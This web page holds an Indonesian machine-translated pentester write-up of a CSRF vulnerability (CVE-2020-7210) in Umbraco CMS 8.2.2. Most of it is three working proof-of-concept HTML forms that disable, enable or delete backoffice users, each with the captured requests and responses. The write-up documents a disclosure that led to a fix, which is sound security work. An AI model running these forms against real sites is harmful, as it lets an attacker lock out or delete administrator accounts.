<!doctype html>
<html class="no-js" lang="id">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🕴🏽 🎞️ 〽️ CSRF di Umbraco CMS 🤞🏿 🏪 🤶🏼</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Pemalsuan permintaan lintas situs dapat digunakan untuk membuat permintaan web sewenang-wenang ke sistem manajemen konten CMS Umbraco dan mengidentifi...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>CSRF di Umbraco CMS</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/ppr/blog/487888/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Pemalsuan permintaan lintas situs dapat digunakan untuk membuat permintaan web sewenang-wenang ke sistem manajemen konten CMS Umbraco dan mengidentifikasi penggunanya tanpa sepengetahuan mereka. </font><font style="vertical-align: inherit;">Serangan seperti itu selalu membutuhkan interaksi dengan pengguna, tetapi, sebagai suatu peraturan, cukup bagi korban untuk mengikuti tautan yang disiapkan secara khusus atau mengunjungi halaman web yang berada di bawah kendali seorang penyerang. </font><font style="vertical-align: inherit;">Ini memungkinkan untuk mengaktifkan, menonaktifkan atau menghapus akun pengguna sepenuhnya. </font><font style="vertical-align: inherit;">Akibatnya, ada ancaman </font><font style="vertical-align: inherit;">serangan </font></font><abbr title="Kegagalan layanan"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DoS</font></font></abbr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> pada akun.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/2w/cx/zm/2wcxzmpfce9tujimp3yzcx6b674.png"><br>
<a name="habracut"></a><br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Latar Belakang</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Selama pengujian penetrasi sumber daya kecil ditemukan </font></font><abbr title="Pemalsuan Permintaan Lintas Situs"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CSRF</font></font></abbr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> -uyazvimost segar </font></font><s><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pada saat</font></font></s><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Umbraco CMS. </font><font style="vertical-align: inherit;">Kerentanan ini memungkinkan untuk mengaktifkan, menonaktifkan, atau sepenuhnya menghapus akun pengguna, termasuk yang memiliki hak administratif. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Terlepas dari kenyataan bahwa dalam laporan OWASP Top Ten 2017 terbaru, kerentanan CSRF meninggalkan daftar 10 yang paling kritis, masih terlalu dini untuk mengabaikannya. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kerentanan diuji pada versi 8.2.2; </font><font style="vertical-align: inherit;">dalam versi 8.5, sudah diperbaiki, tetapi ada kemungkinan bahwa versi lain sebelum itu tetap rentan. </font><font style="vertical-align: inherit;">Pengguna produk ini sangat dianjurkan untuk segera meningkatkan ke versi terbaru yang tersedia.</font></font><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bukti dari konsep</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jika terjadi serangan nyata, dokumen HTML berikut ini akan ditempatkan di situs web jahat yang dikendalikan oleh penyerang.</font></font><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Contoh 1: HTML untuk menonaktifkan pengguna</font></font></h4><br>
<pre><code class="xml hljs"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="hljs-string">''</span>, <span class="hljs-string">''</span>, <span class="hljs-string">'/'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"https://&lt;host-URL&gt;/umbraco/backoffice/UmbracoApi/Users/PostDisableUsers?userIds=&lt;USER-ID&gt;"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Submit request"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Permintaan yang dikirim ke server atas nama korban:</font></font><br>
<br>
<pre><code class="xml hljs">POST /umbraco/backoffice/UmbracoApi/Users/PostDisableUsers?userIds=<span class="hljs-tag">&lt;<span class="hljs-name">USER-ID</span>&gt;</span> HTTP/1.1<font></font>
Host: <span class="hljs-tag">&lt;<span class="hljs-name">host-URL</span>&gt;</span><font></font>
[...]<font></font>
Cookie: <span class="hljs-tag">&lt;<span class="hljs-name">ADMIN-COOKIE</span>&gt;</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Respons yang diterima dari server:</font></font><br>
<br>
<pre><code class="xml hljs">HTTP/1.1 200 OK<font></font>
Cache-Control: no-store, must-revalidate, no-cache, max-age=0<font></font>
Pragma: no-cache<font></font>
Content-Length: 112<font></font>
Content-Type: application/json; charset=utf-8<font></font>
Expires: Mon, 01 Jan 1990 00:00:00 GMT<font></font>
Set-Cookie: <span class="hljs-tag">&lt;<span class="hljs-name">ADMIN-COOKIE</span>&gt;</span><font></font>
Date: Wed, 06 Nov 2019 10:57:45 GMT<font></font>
Connection: close<font></font>
<font></font>
)]}',<font></font>
{"notifications":[{"header":"<span class="hljs-tag">&lt;<span class="hljs-name">USERNAME</span>&gt;</span> is now disabled","message":"","type":3}],"message":"<span class="hljs-tag">&lt;<span class="hljs-name">USERNAME</span>&gt;</span> is now disabled"}
</code></pre><br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Contoh 2: HTML untuk mengaktifkan pengguna</font></font></h4><br>
<pre><code class="xml hljs"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="hljs-string">''</span>, <span class="hljs-string">''</span>, <span class="hljs-string">'/'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"https://&lt;host-URL&gt;/umbraco/backoffice/UmbracoApi/Users/PostEnableUsers?userIds=&lt;USER-ID&gt;"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Submit request"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Penyelidikan:</font></font><br>
<br>
<pre><code class="xml hljs">POST /umbraco/backoffice/UmbracoApi/Users/PostEnableUsers?userIds=<span class="hljs-tag">&lt;<span class="hljs-name">USER-ID</span>&gt;</span> HTTP/1.1<font></font>
Host: <span class="hljs-tag">&lt;<span class="hljs-name">host-URL</span>&gt;</span><font></font>
[...]<font></font>
Cookie: <span class="hljs-tag">&lt;<span class="hljs-name">ADMIN-COOKIE</span>&gt;</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Menjawab:</font></font><br>
<br>
<pre><code class="xml hljs">HTTP/1.1 200 OK<font></font>
Cache-Control: no-store, must-revalidate, no-cache, max-age=0<font></font>
Pragma: no-cache<font></font>
Content-Length: 110<font></font>
Content-Type: application/json; charset=utf-8<font></font>
Expires: Mon, 01 Jan 1990 00:00:00 GMT<font></font>
Date: Wed, 06 Nov 2019 10:58:12 GMT<font></font>
Connection: close<font></font>
<font></font>
)]}',<font></font>
{"notifications":[{"header":"<span class="hljs-tag">&lt;<span class="hljs-name">USERNAME</span>&gt;</span> is now enabled","message":"","type":3}],"message":"<span class="hljs-tag">&lt;<span class="hljs-name">USERNAME</span>&gt;</span> is now enabled"}
</code></pre><br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Contoh 3: HTML untuk menghapus pengguna</font></font></h4><br>
<pre><code class="xml hljs"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="hljs-string">''</span>, <span class="hljs-string">''</span>, <span class="hljs-string">'/'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"https://&lt;host-URL&gt;/umbraco/backoffice/UmbracoApi/Users/PostDeleteNonLoggedInUser?id=&lt;USER-ID&gt;"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Submit request"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Penyelidikan:</font></font><br>
<br>
<pre><code class="xml hljs">POST /umbraco/backoffice/UmbracoApi/Users/PostDeleteNonLoggedInUser?id=<span class="hljs-tag">&lt;<span class="hljs-name">USER-ID</span>&gt;</span> HTTP/1.1<font></font>
Host: <span class="hljs-tag">&lt;<span class="hljs-name">host-URL</span>&gt;</span><font></font>
[...]<font></font>
Cookie: <span class="hljs-tag">&lt;<span class="hljs-name">ADMIN-COOKIE</span>&gt;</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Menjawab:</font></font><br>
<br>
<pre><code class="json hljs">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK<font></font>
Cache-Control: no-store, must-revalidate, no-cache, max-age=<span class="hljs-number">0</span><font></font>
Pragma: no-cache<font></font>
Content-Length: <span class="hljs-number">114</span>
Content-Type: application/json; charset=utf<span class="hljs-number">-8</span>
Expires: Mon, <span class="hljs-number">01</span> Jan <span class="hljs-number">1990</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> GMT<font></font>
Set-Cookie: &lt;ADMIN-COOKIE&gt;<font></font>
Date: Wed, <span class="hljs-number">06</span> Nov <span class="hljs-number">2019</span> <span class="hljs-number">10</span>:<span class="hljs-number">58</span>:<span class="hljs-number">36</span> GMT<font></font>
Connection: close<font></font>
<font></font>
)]}',<font></font>
{<span class="hljs-attr">"notifications"</span>:[{<span class="hljs-attr">"header"</span>:<span class="hljs-string">"User &lt;USERNAME&gt; was deleted"</span>,<span class="hljs-attr">"message"</span>:<span class="hljs-string">""</span>,<span class="hljs-attr">"type"</span>:<span class="hljs-number">3</span>}],<span class="hljs-attr">"message"</span>:<span class="hljs-string">"User &lt;USERNAME&gt; was deleted"</span>}</code></pre><br>
<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><img src="https://habrastorage.org/webt/1k/qi/_s/1kqi_szjtfe0iwkawezl28jrj4o.png"></a><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Korban menerima respons dari server dalam </font></font><abbr title="Notasi Objek JavaScript"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">format JSON</font></font></abbr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (layar yang dapat diklik). </font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Segera setelah korban yang diautentikasi (administrator) mengunjungi situs web dengan HTML jahat yang disematkan, konten jahat yang aktif mulai dijalankan dalam konteks sesi korban. </font><font style="vertical-align: inherit;">Meskipun jawaban atas permintaan ini tidak dikirimkan kepada penyerang, dalam banyak kasus cukup baginya untuk membahayakan integritas informasi korban yang disimpan di situs, atau untuk mengeksekusi permintaan yang berpotensi membahayakan ke situs lain.</font></font><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Alih-alih sebuah kesimpulan</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Meskipun semakin banyak serangan baru-baru ini pergi ke Server-Side dari Client-Side, mereka masih perlu diperhatikan. </font><font style="vertical-align: inherit;">Setelah berbicara dengan klien, kami dengan cepat menghubungi vendor produk perangkat lunak dan menerima informasi tentang koreksi. </font><font style="vertical-align: inherit;">Kerentanan diberikan indeks CVE-2020-7210. </font><font style="vertical-align: inherit;">Saya akui, bagi saya sebagai pentester, ini adalah kerentanan pertama yang menerima indeks CVE.</font></font></div>
      
    </div><p class="reference-to-source js-reference-to-source">Source: https://habr.com/ru/post/undefined/</p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id487874/index.html">Intel NUC Chaco Canyon - Bekerja Di Mana Anda Membutuhkannya</a></li>
<li><a href="../id487876/index.html">Apa itu Windows PowerShell dan apa yang dimakannya? Bagian 1: Fitur Utama</a></li>
<li><a href="../id487878/index.html">5 Pertanyaan SQL yang Sering Diajukan oleh Ilmuwan Data untuk Wawancara Kerja</a></li>
<li><a href="../id487882/index.html">Chrome akan secara otomatis memblokir iklan video yang mengganggu</a></li>
<li><a href="../id487884/index.html">5 hal yang ingin saya ketahui sebelum mengembangkan pertukaran</a></li>
<li><a href="../id487890/index.html">Terjemahkan pidato ke teks di iOS menggunakan kerangka kerja Speech</a></li>
<li><a href="../id487894/index.html">BarsUP.AM: bagaimana kami mengembangkan alat untuk melindungi informasi aplikasi web</a></li>
<li><a href="../id487896/index.html">Ketika kematian berubah menjadi seni: lambang orang-orang terkenal dengan makna mendalam dalam bahasa Inggris</a></li>
<li><a href="../id487898/index.html">Mengukur bandwidth memori pada lutut</a></li>
<li><a href="../id487900/index.html">pyqtdeploy, atau kita kemas program Python di exe'shnik ... dengan cara yang sulit</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>